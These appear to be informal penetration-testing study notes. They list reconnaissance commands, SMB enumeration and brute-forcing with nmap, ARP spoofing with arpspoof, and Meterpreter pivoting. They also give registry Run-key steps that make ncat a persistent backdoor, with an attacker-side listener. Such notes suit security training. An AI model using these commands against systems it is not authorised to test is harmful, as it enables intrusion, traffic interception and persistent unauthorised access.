(a) arp -a on window

#netstat (network statistics) is a command line tool for monitoring network connections both incoming and outgoing as well as viewing routing tables, interface statistics etc. 
to check the listening ports and current(TCP) connection on a host 
(a) netstat -ano on window
(b) netstat -tunp on linux
//using this command to show information about the process listening on the machine and process connecting to remote servers.

#Subdomain Enumeration
(a)dnsdumpster.com subdomain enumeration
https://dnsdumpster.com/
+ There is also tool that extends the capabilities of DNS enumeration,called sublist3r(pre-installed in kali).
+ crt.sh (Certificate Search)

#Vulnerability Scanners
+ There are a lot of vulnerability scanners out there,like OpenVAS,
Nexpose(https://www.rapid7.com/products/nexpose/) or 
GFI LAN Guard(http://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard)
Nessus(http://www.tenable.com/products/nessus)-most popular vulnerability scanners.                                                          

#Footprinting & Scanning
fping use for ping sweeps. "fping -a -g iprange"(a option for alive hosts and g option for ping sweeps)

#Web Server Fingerprinting
(a)Netcat(you will just use the default HTTP port:80)
nc <target address> 80
HEAD / HTTP/1.0
and hit return two times.
(b)OpenSSL(listens to HTTPS connecting)
openssl s_client -connect target.site:443
HEAD / HTTP/1.0
(c)Httprint(uses a signature-based technique to identify web servers)
httprint -P0 -h <target hosts> -s <signature file>
*-P0 to avoid pinging the host(most web servers do not response to ping echo requests)

#Web Attack

#System Attack
Malware samples(http://web.archive.org/web/20150715001201/http:/www.offensivecomputing.net/?q=taxonomy/term/1)
+Backdoor
ncat
Window(victim)
.first download ncat(https://nmap.org/ncat/)
.configure file in registry editor(select_this_path-Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and add new string value inside put value name(depend_you) & value data(path of ncat)
.restart system
Linux(Attacker)
ncat -l -p 44 -v

+Password Attack
Check how to secure my password is(https://www.security.org/how-secure-is-my-password/)
free open source password manager(https://keepass.info/ or https://www.keepassx.org/downloads)
hashcat tool for password cracking

#Network Attacks
You can find a comprenhensive collection of passwords(https://wiki.skullsecurity.org/index.php/Passwords#Password_dictionaries)
 
In Window,the most common command to use when enumerating Windows shares is - nbtstat/?(help command)
To perform the same operations of nbtstat in linux - nmblookup
Exploiting Null Sessions with Enum4linux(in linux) and NET VIEW(in window)
.access window share use smbclient
~smbclient -L //ip_addr -N(L allows look at what service are available and -N forces the tool to not ask for password)
or help of nmap gather info about smb share
~nmap -script=smb-enum-shares
~nmap -script=smb-enum-users
~nmap -script=smb-brute

+ARP Spoofing
Dsniff - is a collection of tools for network auditing.It includes arpspoof a utility desinged to intercept traffic on a switched LAN.
//befor running the tool,you have to enable the linux kernel IP Forwarding, a feature that transforms a linux box into a router.
~echo 1 > /proc/sys/net/ipv4/ip_forward 
//you can then run arpspoof
~arpspoof -i <interface> -t <target> -r <host>
/*interface is the NIC you want to use,e.g. eth0 for your local LAN or tap0 when you are connected to vpn
and Target and Host are the vicitms IP addresses.
*/

+Meterpreter
~background or clt+z (you can switch from a Meterpreter session to the console)
~sessions -l (list current opened sessions)
~sessions -i id_no (to resume a background session)
~getuid (know which user is running the process exploited by metasploit)

Metasploit-Pivoting(https://www.tutorialspoint.com/metasploit/metasploit_pivoting.htm)
+Pivoting is a technique that Metasploit uses to route the traffic from a hacked computer toward other networks that are not accessible by a hacker machine
+Metasploit has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine

PORTFWD(https://www.offensive-security.com/metasploit-unleashed/Portfwd/)
The portfwd command from within the Meterpreter shell is most commonly used as a pivoting technique, allowing direct access to machines otherwise inaccessible from the attacking system.
